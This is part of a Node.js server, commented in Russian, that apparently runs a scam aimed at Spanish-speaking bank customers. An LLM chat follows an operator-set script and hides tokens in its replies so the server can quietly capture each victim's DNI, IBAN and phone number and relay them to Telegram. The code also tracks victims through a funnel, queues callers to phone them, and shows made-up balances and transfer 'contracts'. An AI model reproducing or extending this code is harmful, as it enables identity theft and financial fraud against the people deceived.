      prisma.webClient.delete({ where: { id } }),
    ]);
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[admin-delete-client] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleAdminClients(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const page = Math.max(1, parseInt(req.query.page || '1', 10));
    const limit = 50;
    const skip = (page - 1) * limit;
    const [clients, total] = await Promise.all([
      prisma.webClient.findMany({
        orderBy: { updatedAt: 'desc' },
        skip, take: limit,
        include: { events: { orderBy: { createdAt: 'asc' } } },
      }),
      prisma.webClient.count(),
    ]);
    return reply.send({ clients, total, page, pages: Math.ceil(total / limit) });
  } catch (err) {
    console.error('[admin-clients] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleAdminClientChat(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const flowSessionId = sanitizeString(req.params.sessionId || '', 80);
    // Первый чат (assistant.html) — ключ web:, второй чат (chat.html) — ключ chat:
    const [assistantLead, supportLead] = await Promise.all([
      prisma.lead.findUnique({ where: { tgId: `web:${flowSessionId}` } }),
      prisma.lead.findUnique({ where: { tgId: `chat:${flowSessionId}` } }),
    ]);
    async function leadMessages(lead) {
      if (!lead) return [];
      return prisma.message.findMany({
        where: { leadId: lead.id },
        orderBy: { createdAt: 'asc' },
        select: { role: true, content: true, createdAt: true },
      });
    }
    const [messages, supportMessages] = await Promise.all([
      leadMessages(assistantLead),
      leadMessages(supportLead),
    ]);
    // messages — первый чат (для обратной совместимости), supportMessages — второй
    return reply.send({ messages, supportMessages });
  } catch (err) {
    console.error('[admin-client-chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ─── AI web chat (assistant.html) ─────────────────────────────────────────────
// Один лид на веб-сессию (ключ web:<flowSessionId>); память — сообщения этого лида.

function leadKeyFromSession(sessionId) {
  return `web:${sessionId}`;
}

function historyToLlm(systemPrompt, history) {
  const msgs = [{ role: 'system', content: systemPrompt }];
  for (const m of history) {
    if (m.role === 'USER') msgs.push({ role: 'user', content: m.content });
    else if (m.role === 'ASSISTANT') msgs.push({ role: 'assistant', content: m.content });
  }
  return msgs;
}

async function handleChat(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });

    const message = sanitizeString(getString(body.message), 4000);
    const start = body.start === true;
    const name = sanitizeString(getString(body.name), 120);
    const bank = sanitizeString(getString(body.bank), 120);

    if (!start && !message) return reply.status(400).send({ error: 'message required' });

    const key = leadKeyFromSession(sessionId);
    const lead = await prisma.lead.upsert({
      where: { tgId: key },
      create: { tgId: key, chatId: key, firstName: name || null },
      update: name ? { firstName: name } : {},
    });

    const cfg = await getBotConfig();
    if (!cfg.aiEnabled || !lead.aiEnabled) {
      return reply.send({ reply: '', disabled: true });
    }

    // Сохраняем входящее сообщение клиента (для start-триггера сообщения нет).
    if (message) {
      await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
    }

    const history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      take: cfg.historyLimit,
    });

    // start: если приветствие уже было — не генерируем заново, отдаём последнее.
    if (start && message === '') {
      const lastAssistant = [...history].reverse().find((m) => m.role === 'ASSISTANT');
      if (lastAssistant) return reply.send({ reply: lastAssistant.content });
    }

    const system = buildSystemPrompt(cfg.systemPrompt, { name, bank });
    const llmMessages = historyToLlm(system, history);
    if (start && history.length === 0) {
      llmMessages.push({ role: 'user', content: '[Пользователь только что открыл чат. Поприветствуй его и начни сценарий.]' });
    }

    const rawReply = await deepseekChat(llmMessages, {
      model: cfg.model,
      temperature: cfg.temperature,
      maxTokens: cfg.maxTokens,
    });

    // Extract hidden tokens before stripping them from the user-visible text.
    // Регулярки терпимы к пробелам после двоеточия и внутри значения (ИИ часто форматирует IBAN/телефон с пробелами).
    const dniMatch   = rawReply.match(/\[\[DNI:\s*([A-Z0-9][A-Z0-9 \-]{3,24})\]\]/i);
    const ibanMatch  = rawReply.match(/\[\[IBAN:\s*([A-Z0-9][A-Z0-9 ]{3,44})\]\]/i);
    const phoneMatch = rawReply.match(/\[\[PHONE:\s*([0-9+][0-9+\-() ]{4,24})\]\]/i);
    const extractedDni   = dniMatch   ? dniMatch[1].replace(/[\s\-]/g, '').toUpperCase() : null;
    const extractedIban  = ibanMatch  ? ibanMatch[1].replace(/\s/g, '').toUpperCase() : null;
    const extractedPhone = phoneMatch ? phoneMatch[1].replace(/[^0-9+]/g, '') : null;

    const isDone = rawReply.includes('[[FIN]]');
    const replyText = rawReply
      .replace(/\[\[DNI:[^\]]*\]\]/gi, '')
      .replace(/\[\[IBAN:[^\]]*\]\]/gi, '')
      .replace(/\[\[PHONE:[^\]]*\]\]/gi, '')
      .replace(/\[\[FIN\]\]/g, '')
      .trim();

    await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });

    // Save any extracted tokens to webClient immediately (IBAN from stage 1, DNI/PHONE from stage 4)
    if (extractedDni || extractedIban || extractedPhone) {
      try {
        const existingClient = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { submissionData: true },
        });
        const existingSub = (existingClient?.submissionData && typeof existingClient.submissionData === 'object')
          ? existingClient.submissionData : {};
        const newSub = { ...existingSub };
        if (extractedIban)  newSub.iban  = extractedIban;
        if (extractedDni)   newSub.dni   = extractedDni;
        if (extractedPhone) newSub.phone = extractedPhone;
        await upsertWebClient(sessionId, { submissionData: newSub });
        if (isDone) {
          const tgLines = [
            '*🆔 КЛИЕНТ ПРОШЁЛ ВЕРИФИКАЦИЮ В ЧАТЕ*',
            `Session: \`${sessionId}\``,
            extractedDni   ? `DNI: \`${extractedDni}\`` : '',
            extractedPhone ? `Телефон: \`${extractedPhone}\`` : '',
            newSub.iban    ? `IBAN: \`${newSub.iban}\`` : '',
          ].filter(Boolean);
          sendToTelegram(tgLines.join('\n'));
        }
      } catch (e) {
        console.error('[chat] token save error:', e?.message);
      }
    }

    const extra = {};
    if (extractedIban)  extra.collectedIban  = extractedIban;
    if (extractedDni)   extra.collectedDni   = extractedDni;
    if (extractedPhone) extra.collectedPhone = extractedPhone;
    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}), ...extra });
  } catch (err) {
    console.error('[chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'chat_failed' });
  }
}

async function handleChatHistory(req, reply) {
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  reply.header('Cache-Control', 'no-store');
  if (!sessionId) return reply.send({ messages: [] });
  const lead = await prisma.lead.findUnique({ where: { tgId: leadKeyFromSession(sessionId) } });
  if (!lead) return reply.send({ messages: [] });
  const history = await prisma.message.findMany({
    where: { leadId: lead.id },
    orderBy: { createdAt: 'asc' },
    select: { role: true, content: true },
  });
  return reply.send({
    messages: history.map((m) => ({ role: m.role.toLowerCase(), content: m.content })),
  });
}

// ─── Admin panel (/admin.html) ────────────────────────────────────────────────

async function handleAdminLogin(req, reply) {
  const body = asRecord(req.body) ?? {};
  const login = getString(body.login);
  const password = getString(body.password);
  if (login !== config.admin.login || password !== config.admin.password) {
    return reply.status(401).send({ error: 'Неверный логин или пароль' });
  }
  const token = randomUUID() + randomUUID();
  sessionAdd(adminSessions, token);
  return reply.send({ token });
}

async function handleAdminLogout(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (token) { adminSessions.delete(token); saveSessions(); }
  return reply.send({ ok: true });
}

function serializeBotConfig(cfg) {
  return {
    systemPrompt: cfg.systemPrompt,
    model: cfg.model,
    temperature: cfg.temperature,
    maxTokens: cfg.maxTokens,
    historyLimit: cfg.historyLimit,
    aiEnabled: cfg.aiEnabled,
  };
}

async function handleGetBotConfig(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const cfg = await getBotConfig();
  return reply.send(serializeBotConfig(cfg));
}

async function handleUpdateBotConfig(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const patch = {};
    // Промпт: разрешаем многострочный текст, до 20000 символов (sanitizeString сохраняет \n).
    if (typeof body.systemPrompt === 'string') patch.systemPrompt = sanitizeString(body.systemPrompt, 20000);
    if (typeof body.model === 'string') patch.model = sanitizeString(body.model, 80);
    if (typeof body.temperature === 'number') patch.temperature = body.temperature;
    if (typeof body.maxTokens === 'number') patch.maxTokens = body.maxTokens;
    if (typeof body.historyLimit === 'number') patch.historyLimit = body.historyLimit;
    if (typeof body.aiEnabled === 'boolean') patch.aiEnabled = body.aiEnabled;

    const updated = await updateBotConfig(patch);
    return reply.send(serializeBotConfig(updated));
  } catch (err) {
    console.error('[admin] update bot-config error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

async function handleGeo(req, reply) {
  const ip = getClientIp(req);
  try {
    const result = await resolveGeo(req, ip);
    const geo = result.geo || {};
    if (!result.available || !geo.country) {
      return reply.send({ ok: false });
    }
    return reply.send({
      ok: true,
      country: geo.country || '',
      city: geo.city || '',
      region: geo.region || '',
      postal: geo.postal || '',
    });
  } catch {
    return reply.send({ ok: false });
  }
}

// ── Public settings (IBAN / beneficiario) ────────────────────────────────────
async function handleGetSettings(req, reply) {
  return reply.send(await readSettings());
}

async function handleUpdateSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const settings = await readSettings();
    const iban = sanitizeString(getString(body.iban), 50);
    const beneficiario = sanitizeString(getString(body.beneficiario), 200);
    if (iban) settings.iban = iban;
    if (beneficiario) settings.beneficiario = beneficiario;
    await writeSettings(settings);
    return reply.send(settings);
  } catch (err) {
    console.error('[settings] update error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// ── Admin statistics / funnel ─────────────────────────────────────────────────
async function handleAdminStats(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const [
      totalClients,
      callRequestedCount,
      operatorCalledCount,
      inLKList,
      chatReachedList,
      botStartedList,
      botFinishedList,
      formFilledList,
      paymentList,
    ] = await Promise.all([
      prisma.webClient.count(),
      prisma.webClient.count({ where: { callRequested: true } }),
      prisma.webClient.count({ where: { operatorCalled: true } }),
      prisma.webEvent.findMany({ where: { event: 'tourist_active' }, select: { flowSessionId: true }, distinct: ['flowSessionId'] }),
      prisma.webEvent.findMany({ where: { event: 'tourist_chat_reached' }, select: { flowSessionId: true }, distinct: ['flowSessionId'] }),
      prisma.webEvent.findMany({ where: { event: 'tourist_bot_started' }, select: { flowSessionId: true }, distinct: ['flowSessionId'] }),
      prisma.webEvent.findMany({ where: { event: { in: ['tourist_bot_finished_dialogue', 'tourist_bot_finished'] } }, select: { flowSessionId: true }, distinct: ['flowSessionId'] }),
      prisma.webEvent.findMany({ where: { event: 'tourist_card_ordered' }, select: { flowSessionId: true }, distinct: ['flowSessionId'] }),
      prisma.webEvent.findMany({ where: { event: 'tourist_payment_page_opened' }, select: { flowSessionId: true }, distinct: ['flowSessionId'] }),
    ]);
    return reply.send({
      totalClients,
      inLK: inLKList.length,
      chatReached: chatReachedList.length,
      botStarted: botStartedList.length,
      botFinished: botFinishedList.length,
      formFilled: formFilledList.length,
      callRequested: callRequestedCount,
      operatorCalled: operatorCalledCount,
      payment: paymentList.length,
    });
  } catch (err) {
    console.error('[admin-stats] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ─── Support chat (chat.html) ─────────────────────────────────────────────────
// Separate session prefix "chat:" keeps histories isolated from assistant.html ("web:").

async function readChatPromptFile() {
  try { return (await readFile(CHAT_PROMPT_FILE, 'utf8')).trim(); } catch { return ''; }
}

function chatLeadKey(sessionId) {
  return `chat:${sessionId}`;
}

async function handleSupportChat(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });

    const message = sanitizeString(getString(body.message), 4000);
    const start = body.start === true;
    const name = sanitizeString(getString(body.name), 120);
    const bank = sanitizeString(getString(body.bank), 120);

    if (!start && !message) return reply.status(400).send({ error: 'message required' });

    // Client is active — cancel any pending push notification
    if (!start) cancelPush(sessionId);

    const key = chatLeadKey(sessionId);
    const lead = await prisma.lead.upsert({
      where: { tgId: key },
      create: { tgId: key, chatId: key, firstName: name || null },
      update: name ? { firstName: name } : {},
    });

    // As soon as chat opens — make client visible to chat operator immediately
    if (start) {
      const ip = getClientIp(req);
      const skipStatuses = new Set(['ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)', 'ЧАТ: НУЖЕН ЗВОНОК', 'ОПЕРАТОР ПРОЗВОНИЛ']);
      try {
        const existing = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { status: true },
        });
        const shouldSetStatus = !existing || !skipStatuses.has(existing.status || '');
        await prisma.webClient.upsert({
          where: { flowSessionId: sessionId },
          create: {
            flowSessionId: sessionId,
            status: 'ЧАТ: АКТИВЕН',
            ip: ip || '',
            ...(name ? { nombre: name } : {}),
            ...(bank ? { bank } : {}),
          },
          update: {
            ip: ip || '',
            ...(name ? { nombre: name } : {}),
            ...(bank ? { bank } : {}),
            ...(shouldSetStatus ? { status: 'ЧАТ: АКТИВЕН' } : {}),
          },
        });
        broadcastUpdate('clients_changed');
      } catch { /* non-fatal */ }
    }

    // Track payment screenshot status
    if (message && message.startsWith('PAYMENT_SCREENSHOT:')) {
      const url = message.slice('PAYMENT_SCREENSHOT:'.length);
      paymentStatus.set(sessionId, { status: 'pending', url, sentAt: Date.now() });
      await savePaymentStatus();
    }

    // If AI is disabled — save the message for audit but don't call AI
    if (!lead.aiEnabled) {
      if (message) {
        await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
      }
      return reply.send({ reply: '' });
    }

    const cfg = await getBotConfig();
    if (!cfg.aiEnabled) {
      return reply.send({ reply: '', disabled: true });
    }

    if (message) {
      await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
    }

    const history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      take: cfg.historyLimit,
    });

    if (start && !message) {
      const last = [...history].reverse().find((m) => m.role === 'ASSISTANT');
      if (last) return reply.send({ reply: last.content });
    }

    const rawPrompt = (await readChatPromptFile()) || 'Ты специалист поддержки. Помоги клиенту.';
    const system = buildSystemPrompt(rawPrompt, { name, bank });

    const msgs = [{ role: 'system', content: system }];
    for (const m of history) {
      if (m.role === 'USER') msgs.push({ role: 'user', content: m.content });
      else if (m.role === 'ASSISTANT') msgs.push({ role: 'assistant', content: m.content });
    }
    if (start && history.length === 0) {
      msgs.push({ role: 'user', content: '[Пользователь только что открыл чат. Поприветствуй его и начни диалог.]' });
    }

    const rawReply = await deepseekChat(msgs, {
      model: cfg.model,
      temperature: cfg.temperature,
      maxTokens: cfg.maxTokens,
    });

    // Extract hidden tokens from second chat (DNI and PHONE).
    // Регулярки терпимы к пробелам после двоеточия и внутри значения.
    const dniMatch2   = rawReply.match(/\[\[DNI:\s*([A-Z0-9][A-Z0-9 \-]{3,24})\]\]/i);
    const phoneMatch2 = rawReply.match(/\[\[PHONE:\s*([0-9+][0-9+\-() ]{4,24})\]\]/i);
    const extractedDni2   = dniMatch2   ? dniMatch2[1].replace(/[\s\-]/g, '').toUpperCase() : null;
    const extractedPhone2 = phoneMatch2 ? phoneMatch2[1].replace(/[^0-9+]/g, '') : null;

    const isDone = rawReply.includes('[[DONE]]');
    const replyText = rawReply
      .replace(/\[\[DNI:[^\]]*\]\]/gi, '')
      .replace(/\[\[PHONE:[^\]]*\]\]/gi, '')
      .replace(/\[\[DONE\]\]/g, '')
      .trim();

    await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });
    // Schedule push if client doesn't reply within configured delay
    schedulePush(sessionId);

    // Save DNI/PHONE to webClient.submissionData immediately when extracted
    if (extractedDni2 || extractedPhone2) {
      try {
        const existingClient = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { submissionData: true },
        });
        const existingSub = (existingClient?.submissionData && typeof existingClient.submissionData === 'object')
          ? existingClient.submissionData : {};
        const newSub = { ...existingSub };
        if (extractedDni2)   newSub.dni   = extractedDni2;
        if (extractedPhone2) newSub.phone = extractedPhone2;
        await upsertWebClient(sessionId, { submissionData: newSub });
      } catch (e) {
        console.error('[support-chat] token save error:', e?.message);
      }
    }

    if (isDone) {
      // Disable further AI replies for this lead
      await prisma.lead.update({ where: { id: lead.id }, data: { aiEnabled: false } });

      // Mark webClient as call-requested so they appear in caller panel
      const ip = getClientIp(req);
      const country = getGeoFromHeaders(req)?.country || '';
      let nombre = name;
      let bank_ = bank;
      try {
        const wc = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { nombre: true, bank: true, submissionData: true },
        });
        if (wc) {
          nombre = nombre || wc.nombre || '';
          bank_ = bank_ || wc.bank || '';
        }
      } catch { /* non-fatal */ }

      try {
        await prisma.webClient.upsert({
          where: { flowSessionId: sessionId },
          create: {
            flowSessionId: sessionId,
            callRequested: true,
            status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)',
            ip: ip || '',
            ...(nombre ? { nombre } : {}),
            ...(bank_ ? { bank: bank_ } : {}),
          },
          update: {
            callRequested: true,
            status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)',
            ip: ip || '',
            ...(nombre ? { nombre } : {}),
            ...(bank_ ? { bank: bank_ } : {}),
          },
        });
      } catch (wcErr) {
        console.error('[support-chat] upsertWebClient failed:', wcErr?.message || wcErr);
      }
      await createWebEvent(sessionId, null, 'tourist_call_requested', { bank: bank_ || null, ip: ip || null });

      const lines = [
        '*💬 КЛИЕНТ ЗАКОНЧИЛ ЧАТ (передан оператору)*',
        `Session: \`${sessionId}\``,
        nombre ? `Имя: *${nombre}*` : '',
        bank_ ? `Банк: *${bank_}*` : '',
        `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
      ].filter(Boolean);
      sendToTelegram(lines.join('\n'));
      // Уведомляем прозвонщика/чат-оператора по SSE — новый заказ появляется без ручного обновления
      broadcastUpdate('clients_changed');
    }

    const extra2 = {};
    if (extractedDni2)   extra2.collectedDni   = extractedDni2;
    if (extractedPhone2) extra2.collectedPhone = extractedPhone2;
    return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}), ...extra2 });
  } catch (err) {
    console.error('[support-chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'chat_failed' });
  }
}

async function handleSupportChatHistory(req, reply) {
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  reply.header('Cache-Control', 'no-store');
  if (!sessionId) return reply.send({ messages: [], closed: false });
  const lead = await prisma.lead.findUnique({ where: { tgId: chatLeadKey(sessionId) } });
  if (!lead) return reply.send({ messages: [], closed: false });
  const history = await prisma.message.findMany({
    where: { leadId: lead.id },
    orderBy: { createdAt: 'asc' },
    select: { role: true, content: true },
  });
  return reply.send({
    messages: history.map((m) => ({ role: m.role.toLowerCase(), content: m.content })),
    closed: !lead.aiEnabled,
  });
}

async function handleGetChatPrompt(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const prompt = await readChatPromptFile();
  return reply.send({ chatPrompt: prompt });
}

async function handleUpdateChatPrompt(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    if (typeof body.chatPrompt !== 'string') return reply.status(400).send({ error: 'chatPrompt required' });
    const prompt = sanitizeString(body.chatPrompt, 20000).replace(/\r\n/g, '\n');
    await writeFile(CHAT_PROMPT_FILE, prompt.endsWith('\n') ? prompt : prompt + '\n', 'utf8');
    return reply.send({ chatPrompt: prompt });
  } catch (err) {
    console.error('[admin] update chat-prompt error:', err?.message || err);
    return reply.status(500).send({ error: 'update_failed' });
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Chat operator (chat/index.html)
// ─────────────────────────────────────────────────────────────────────────────

function requireChatOp(req, reply) {
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
  if (!token || !sessionValid(chatOpSessions, token)) {
    reply.status(401).send({ error: 'unauthorized' });
    return false;
  }
  return true;
}

async function handleChatOpLogin(req, reply) {
  const body = asRecord(req.body) ?? {};
  const login = getString(body.login);
  const password = getString(body.password);
  if (login !== config.chatOp.login || password !== config.chatOp.password) {
    return reply.status(401).send({ error: 'Неверный логин или пароль' });
  }
  const token = randomUUID() + randomUUID();
  sessionAdd(chatOpSessions, token);
  return reply.send({ token });
}

async function handleChatOpClients(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const clients = await prisma.webClient.findMany({
      where: { OR: [{ operatorCalled: true }, { status: 'ЧАТ: НУЖЕН ЗВОНОК' }, { status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)' }] },
      orderBy: { updatedAt: 'desc' },
      select: {
        id: true, flowSessionId: true, nombre: true, email: true, bank: true,
        ip: true, status: true, callerNote: true, submissionData: true,
        calledAt: true, createdAt: true, updatedAt: true,
        callRequested: true, operatorCalled: true, balance: true, transactions: true,
        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
      },
    });
    const enriched = await Promise.all(clients.map(async (c) => {
      try {
        const lead = await prisma.lead.findUnique({
          where: { tgId: chatLeadKey(c.flowSessionId) },
          select: { id: true, aiEnabled: true },
        });
        let lastMsg = null;
        if (lead) {
          const last = await prisma.message.findFirst({
            where: { leadId: lead.id },
            orderBy: { createdAt: 'desc' },
            select: { role: true, content: true, createdAt: true },
          });
          if (last) {
            const role = last.content === 'CALLER_ACTION_BUTTONS'
              ? 'user'
              : last.role === 'SYSTEM' ? 'operator' : last.role.toLowerCase();
            lastMsg = { role, content: last.content, createdAt: last.createdAt };
          }
        }
        return { ...c, lastMsg, paymentPending: paymentStatus.get(c.flowSessionId)?.status === 'pending' };
      } catch { return { ...c, lastMsg: null, paymentPending: false }; }
    }));
    return reply.send({ clients: enriched });
  } catch (err) {
    console.error('[chat-op/clients]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpMessages(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  if (!sessionId) return reply.send({ messages: [], callerNote: null });
  try {
    const [lead, wc] = await Promise.all([
      prisma.lead.findUnique({ where: { tgId: chatLeadKey(sessionId) } }),
      prisma.webClient.findUnique({ where: { flowSessionId: sessionId }, select: { callerNote: true, nombre: true, email: true, bank: true, ip: true, submissionData: true } }),
    ]);
    if (!lead) return reply.send({ messages: [], callerNote: wc?.callerNote || null, client: wc });
    const history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      select: { role: true, content: true, createdAt: true },
    });
    const sub = (wc?.submissionData && typeof wc.submissionData === 'object') ? wc.submissionData : {};
    return reply.send({
      messages: history.map((m) => ({ role: m.role === 'SYSTEM' ? 'operator' : m.role.toLowerCase(), content: m.content, createdAt: m.createdAt })),
      callerNote: wc?.callerNote || null,
      chatLastReadAt: sub.chatLastReadAt || null,
      client: wc,
      paymentStatus: paymentStatus.get(sessionId)?.status || 'none',
    });
  } catch (err) {
    console.error('[chat-op/messages]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpSend(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const message = sanitizeString(getString(body.message), 4000);
    if (!sessionId || !message) return reply.status(400).send({ error: 'missing fields' });
    const key = chatLeadKey(sessionId);
    const lead = await prisma.lead.upsert({
      where: { tgId: key },
      create: { tgId: key, chatId: key },
      update: {},
    });
    await prisma.message.create({ data: { leadId: lead.id, role: 'SYSTEM', content: message } });
    await prisma.webClient.updateMany({
      where: { flowSessionId: sessionId, status: 'ЗАПРОСИЛ ЗВОНОК (ЧЕРЕЗ ЧАТ)' },
      data: { status: 'ЧАТ: АКТИВЕН' },
    });
    // Schedule push notification if client doesn't respond within configured delay
    schedulePush(sessionId);
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[chat-op/send]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpRequestCall(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const comment = sanitizeString(getString(body.comment), 500);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { submissionData: true },
    });
    const existingSub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
    await prisma.webClient.upsert({
      where: { flowSessionId: sessionId },
      // ПРОЗВОН из чата: сбрасываем operatorCalled → прозвонщик видит заказ в основной очереди.
      // Чат остаётся у чат-оператора за счёт фильтра по status='ЧАТ: НУЖЕН ЗВОНОК' (см. handleChatOpClients).
      create: { flowSessionId: sessionId, callRequested: true, operatorCalled: false, operatorStatus: 'pending', status: 'ЧАТ: НУЖЕН ЗВОНОК', submissionData: { ...existingSub, ...(comment ? { chatOpNote: comment } : {}) } },
      update: { callRequested: true, operatorCalled: false, operatorStatus: 'pending', status: 'ЧАТ: НУЖЕН ЗВОНОК', submissionData: { ...existingSub, ...(comment ? { chatOpNote: comment } : {}) } },
    });
    sendToTelegram(`*📞 ЧАТ-ОПЕРАТОР: ЗАКАЗАН ЗВОНОК*\nSession: \`${sessionId}\`${comment ? `\nКомментарий: _${comment}_` : ''}`);
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[chat-op/request-call]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpSaveNote(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const note = sanitizeString(getString(body.note), 2000);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    await prisma.webClient.upsert({
      where: { flowSessionId: sessionId },
      create: { flowSessionId: sessionId, callerNote: note || null },
      update: { callerNote: note || null },
    });
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[chat-op/note]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpSendPush(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    console.log(`[Push] Manual push request | session=${sessionId.slice(0, 12)}... | tokens in store=${pushTokens.size}`);
    const token = pushTokens.get(sessionId);
    if (!token) {
      console.log(`[Push] Manual push FAILED — no token for session=${sessionId.slice(0, 12)}... | known sessions: [${[...pushTokens.keys()].map(k => k.slice(0,8)).join(', ')}]`);
      return reply.send({ ok: false, reason: 'no_token' });
    }
    console.log(`[Push] Manual push sending | session=${sessionId.slice(0, 12)}... | token=${token.slice(0, 16)}...`);
    const settings = await readPushSettings();
    const sent = await sendPush(token, settings.title || '¡Tienes un nuevo mensaje!', settings.body || 'Hemos enviado una respuesta. Abre el chat para verla.', settings.url);
    console.log(`[Push] Manual push ${sent ? 'sent OK' : 'FAILED (FCM error)'} | session=${sessionId.slice(0, 12)}...`);
    return reply.send({ ok: sent });
  } catch (err) {
    console.error('[chat-op/send-push]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleSupportChatMarkRead(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.send({ ok: true });
    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { submissionData: true },
    });
    const sub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
    await prisma.webClient.upsert({
      where: { flowSessionId: sessionId },
      create: { flowSessionId: sessionId, submissionData: { ...sub, chatLastReadAt: new Date().toISOString() } },
      update: { submissionData: { ...sub, chatLastReadAt: new Date().toISOString() } },
    });
    return reply.send({ ok: true });
  } catch { return reply.send({ ok: true }); }
}

// ── Charge (chat-op debits client balance) ────────────────────────────────────
async function handleChatOpCharge(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const amount = parseFloat(body.amount);
    const rawDescription = sanitizeString(getString(body.description), 200);
    const defaultContractLabel = 'Contrato Nº ES-4738D9215';
    const legacyDefaultDescriptions = new Set(['\u0421\u043f\u0438\u0441\u0430\u043d\u0438\u0435']);
    const contractLabel = (!rawDescription || legacyDefaultDescriptions.has(rawDescription))
      ? defaultContractLabel
      : rawDescription;
    if (!sessionId || !isFinite(amount) || amount <= 0) {
      return reply.status(400).send({ error: 'invalid_params' });
    }
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { balance: true, transactions: true },
    });
    if (!wc) return reply.status(404).send({ error: 'not_found' });
    const newBalance = Math.max(0, (wc.balance ?? 5000) - amount);
    const txs = Array.isArray(wc.transactions) ? [...wc.transactions] : [];
    txs.push({ id: randomUUID(), type: 'debit', amount, description: 'Transferencia al IBAN', contractLabel, date: new Date().toISOString() });
    await prisma.webClient.update({
      where: { flowSessionId: sessionId },
      data: { balance: newBalance, transactions: txs },
    });
